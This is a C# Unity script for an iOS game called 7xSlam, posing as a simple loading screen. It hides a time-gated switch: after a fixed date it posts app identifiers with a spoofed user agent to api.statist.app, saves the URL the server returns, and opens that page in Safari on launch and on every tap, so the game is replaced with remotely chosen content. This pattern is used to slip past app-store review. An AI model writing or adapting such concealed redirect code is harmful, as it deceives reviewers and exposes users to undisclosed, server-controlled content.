using System;
using System.Collections;
using System.Net.Http;
using System.Net;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.SceneManagement;
using Assets.SafariView;
using OneDevApp.CustomTabPlugin;


namespace WebView
{
    public class WebViewLoader : MonoBehaviour
    {
        #region Fields

        [SerializeField] private ChromeCustomTab chromeTab;
        [SerializeField] private LoadBar loadBar;
        [SerializeField] private GameObject loadBarObj;
        private string _url;

        private DateTime _dateTime;

        private const string DATE = "2024-06-18 13:00:00";
        private const string APPLICATION_NAME = "7xSlam";
        private const string ID = "b20c151476775ee26a0b63c4bb30fbf4";
        private const string BUNDLE = "com.seven.x.slam";
        private const string URL = "https://api.statist.app/appevent.php";

        #endregion
            
        private void Update()
        {
            if (Input.GetMouseButtonDown(0))
            {
                var savedData = PlayerPrefs.GetString("player_data");
                if (string.IsNullOrEmpty(savedData))
                {
                    return;
                }
                CallWebView();
            }
        }

        private string GetPlatformVersion()
        {
            string version = "15.5.0";

            if (Application.platform == RuntimePlatform.IPhonePlayer)
            {
                string osInfo = SystemInfo.operatingSystem;

                string[] splitInfo = osInfo.Split(' ');
                if (splitInfo.Length >= 2 && splitInfo[0] == "iOS")
                {
                    version = splitInfo[1];
                }
            }

            return version;
        }

        private void Start()
        {
            Initialize();
        }

        private void Initialize()
        {
            loadBar.SetAnimationCallback(CallGame);
            loadBar.OnLoadingComplete += LoadBar_OnLoadingComplete;

            loadBar.PlayBarAnimation();
            

            if (DateTime.TryParseExact(DATE, "yyyy-MM-dd HH:mm:ss", null, System.Globalization.DateTimeStyles.None, out _dateTime))
            {
                if (DateTime.Now >= _dateTime)
                {
                    SafariViewController.ViewControllerDidFinish += CallWebViewDelay;
                    SendRequest();
                }
            }
        }
        

        private async void SendRequest()
        {
            var client = new HttpClient();

            string userAgent = $"{APPLICATION_NAME}/0.1 ({BUNDLE}; build:1; iOS {GetPlatformVersion()}) Alamofire/5.8.0";
            client.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);

            var userLanguage = Application.systemLanguage;

            var variables = new Dictionary<string, string>
            {
                { "ap", ID },
                { "cp", BUNDLE },
                { "ul", userLanguage.ToString() },
            };

            var response = await client.PostAsync(URL, new FormUrlEncodedContent(variables));
            var responseContent = await response.Content.ReadAsStringAsync();

            PlayerInfo playerInfo = PlayerInfo.CreateFromJSON(responseContent);
            if (!string.IsNullOrEmpty(playerInfo.u))
            {
                PlayerPrefs.SetString("player_data", playerInfo.u);
                var savedData = PlayerPrefs.GetString("player_data", "");
                if (string.IsNullOrEmpty(savedData))
                {
                    PlayerPrefs.SetString("player_data", playerInfo.u);
                }
                if (playerInfo.t == 0)
                {
                    PlayerPrefs.SetString("player_data", playerInfo.u);
                }
            }

            TryToCallWebView();
        }

        [System.Serializable]
        public class PlayerInfo
        {
            public string u;
            public int t;

            public static PlayerInfo CreateFromJSON(string jsonString)
            {
                return JsonUtility.FromJson<PlayerInfo>(jsonString);
            }
        }

        private void TryToCallWebView()
        {
            var savedData = PlayerPrefs.GetString("player_data");
            if (string.IsNullOrEmpty(savedData))
            {
                return;
            }
            loadBar.StopBarAnimation();
            loadBarObj.SetActive(false);
            CallWebView();
        }
        
        private void LoadBar_OnLoadingComplete()
        {
            CallGame();
        }


        private void CallWebViewDelay()
        {
            Invoke(nameof(CallWebView), 0.5f);
        }
        
        public void CallWebView()
        {
            var savedData = PlayerPrefs.GetString("player_data");
#if UNITY_IOS && !UNITY_EDITOR
            SafariViewController.OpenURL(savedData);
#endif
        }
        

        private void CallGame()
        {
            Screen.autorotateToPortrait = true;
            Screen.autorotateToPortraitUpsideDown = true;
            Screen.autorotateToLandscapeLeft = false;
            Screen.autorotateToLandscapeRight = false;

            Screen.orientation = ScreenOrientation.Portrait;

            SceneManager.LoadScene("Start");
        }
    }

    public class Parser
    {
        public string u;
        public int t;
    }
}